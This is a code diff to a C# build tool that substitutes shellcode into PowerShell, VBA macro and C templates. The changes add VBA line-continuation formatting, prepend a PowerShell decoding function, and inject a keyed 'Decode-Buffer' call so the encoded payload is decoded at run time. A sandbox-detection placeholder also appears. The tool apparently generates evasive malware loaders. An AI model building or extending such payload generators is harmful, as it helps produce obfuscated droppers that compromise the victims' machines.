@@ -5,6 +5,7 @@ using System.IO;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Text.RegularExpressions;
+using static System.Net.Mime.MediaTypeNames;
 
 
 
@@ -117,6 +118,11 @@ namespace Build
                     else if (bcl == ByteCodeLang.c)
                     {
                         sb.Append($"\"\n");
+
+                    }
+                    else if (bcl == ByteCodeLang.vba)
+                    {
+                        sb.Append($" _\n");
 
                     }
 
@@ -302,11 +308,27 @@ namespace Build
                     text = text.Replace("{DETECT_SANDBOX_TIME}", "");
                 }
 
+                if (fi.Extension == ".ps1")
+                {
+                    if (CONFIG.ENCODED)
+                    {
+                        string ff = $"{args[0]}\\Templates\\tmp_ps_decode_func.txt";
+                        string func = File.ReadAllText(ff);
+                        text = func + "\n\n" + text;
+                    }
+                }
+
 
                 //Convert shellcode strings to appropriate language
                 if (fi.Extension == ".ps1")
                 {
                     text = text.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE, ByteCodeLang.ps1));
+
+                    if (CONFIG.ENCODED)
+                    {
+                        text = text.Replace("{DECODE}", $"${CONFIG.SHELLCODE_NAME} = Decode-Buffer -InputBuffer ${CONFIG.SHELLCODE_NAME} -Key ([byte]0x{CONFIG.KEY.ToString("X2")})");
+                    }
+
                 } else if (fi.Extension == ".vba") 
                 {
                     text = text.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE, ByteCodeLang.vba));
@@ -318,10 +340,14 @@ namespace Build
                     text = text.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE, ByteCodeLang.c));
                 }
 
+                text = text.Replace("{DECODE}", "");
+
                 //Write to artifacts folder
                 string nf = f.Replace("Templates", "Artifacts");
                 File.WriteAllText(nf, text);
             }
+
+            
 
 
 
